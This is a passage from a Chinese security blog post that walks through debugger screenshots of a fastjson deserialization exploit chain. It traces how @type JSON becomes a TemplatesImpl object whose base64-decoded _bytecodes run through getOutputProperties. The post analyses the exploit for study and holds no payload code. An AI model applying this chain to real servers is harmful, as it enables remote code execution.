+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041622853.webp" alt="image-20240904162247693" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041622853.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041622853.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041622853.webp?size=large 2x" data-title="image-20240904162247693" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>又回到了那个while循环里边</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041623036.webp" alt="image-20240904162327839" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041623036.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041623036.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041623036.webp?size=large 2x" data-title="image-20240904162327839" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<blockquote>
+<p>这里解释一下这个循环，他是利用了这个循环，把JSON中的每一个属性放进反序列化出来的类中，变成完整的、与JSON数据对应的类</p>
+</blockquote>
+<p>while循环里把参数代入，走进<code>parseField</code>方法里面（注意这里也是会进好几次<code>parseField</code>方法，可以观察每次的key是不同的，这个循环往复的过程中在持续恢复object对象，也就是tempslate）</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041103280.webp" alt="image-20240904110300079" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041103280.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041103280.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041103280.webp?size=large 2x" data-title="image-20240904110300079" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>parseField方法</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041108696.webp" alt="image-20240904110829495" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041108696.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041108696.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041108696.webp?size=large 2x" data-title="image-20240904110829495" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>调用smartMatch，对-和_进行处理</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041128223.webp" alt="image-20240904112845074" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041128223.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041128223.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041128223.webp?size=large 2x" data-title="image-20240904112845074" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>跟进parseField方法，这里实例化了一个<code>DefaultFieldDeserializer</code>，然后再执行DefaultFieldDeserializer的<code>parseField</code>方法</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041638876.webp" alt="image-20240904163819663" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041638876.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041638876.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041638876.webp?size=large 2x" data-title="image-20240904163819663" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里最后执行的<code>this.fieldValueDeserilizer.deserialze</code></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041639783.webp" alt="image-20240904163942612" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041639783.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041639783.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041639783.webp?size=large 2x" data-title="image-20240904163942612" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>跟进去看</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041138159.webp" alt="image-20240904113831991" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041138159.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041138159.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041138159.webp?size=large 2x" data-title="image-20240904113831991" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里定义了一个空数组，然后执行了<code>parser.parseArray</code></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041652963.webp" alt="image-20240904165206799" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041652963.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041652963.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041652963.webp?size=large 2x" data-title="image-20240904165206799" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>跟进parseArray，这里执行了<code>array.add</code>，把_bytycode给加进去了，那么他add的val是怎么来的我们得跟一下前面的deserialze</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041651769.webp" alt="image-20240904165106523" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041651769.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041651769.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041651769.webp?size=large 2x" data-title="image-20240904165106523" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>进去关注到这个函数bytesValue</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041653895.webp" alt="image-20240904165327774" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041653895.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041653895.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041653895.webp?size=large 2x" data-title="image-20240904165327774" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>他会把我们的bytecode给base64解码，这也解释了我们为啥要把他base64给编码了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041718504.webp" alt="image-20240904171804299" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041718504.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041718504.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041718504.webp?size=large 2x" data-title="image-20240904171804299" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>return了我们解码了的bytecode，然后add进数组</p>
+<p>最后再回到前面，执行<code>this.toObjectArray(parser, componentClass, array)</code></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041656181.webp" alt="image-20240904165618017" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041656181.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041656181.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041656181.webp?size=large 2x" data-title="image-20240904165618017" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里就把bytecode给放入array了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041657097.webp" alt="image-20240904165721894" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041657097.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041657097.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041657097.webp?size=large 2x" data-title="image-20240904165721894" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>出来了，赋值给value</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041659953.webp" alt="image-20240904165945664" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041659953.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041659953.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041659953.webp?size=large 2x" data-title="image-20240904165945664" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后交给object(tempslate)</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041700052.webp" alt="image-20240904170037822" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041700052.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041700052.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041700052.webp?size=large 2x" data-title="image-20240904170037822" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041701016.webp" alt="image-20240904170103842" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041701016.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041701016.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041701016.webp?size=large 2x" data-title="image-20240904170103842" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>最后也是由这个setvalue触发方法执行</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041704522.webp" alt="image-20240904170450275" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041704522.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041704522.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041704522.webp?size=large 2x" data-title="image-20240904170450275" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后就到了invoke了，执行TemplateImpl的<code>getOutputProperties</code></p>
+<p>在此之前setvalue调用的都是这里</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041724676.webp" alt="image-20240904172401481" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041724676.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041724676.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041724676.webp?size=large 2x" data-title="image-20240904172401481" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里method是TemplatesImpl.getOutputProperties()，object是我们tempslate，tempslate里的<code>_bytecodes</code>就是我们后面会执行的字节码</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041711245.webp" alt="image-20240904171156992" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041711245.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041711245.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041711245.webp?size=large 2x" data-title="image-20240904171156992" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>后面就是tempslate的内容了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041712009.webp" alt="image-20240904171222847" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041712009.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041712009.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409041712009.webp?size=large 2x" data-title="image-20240904171222847" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>总结：json.parse根据我们传的@type将json的内容实例化为tempslate类，最终在while大循环里面的parseField的内层的setvalue触发getOutputProperties执行</p>
+<hr>
+<h2 id="未完待续" class="heading-element"><span>未完待续</span>
+  <a href="#%e6%9c%aa%e5%ae%8c%e5%be%85%e7%bb%ad" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-09-04 17:35:01">Updated on 2024-09-04&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Java安全">Java安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jndi%E6%B3%A8%E5%85%A5-%E5%9F%BA%E7%A1%80/" class="post-nav-item" rel="prev" title="JNDI注入-基础"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>JNDI注入-基础</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
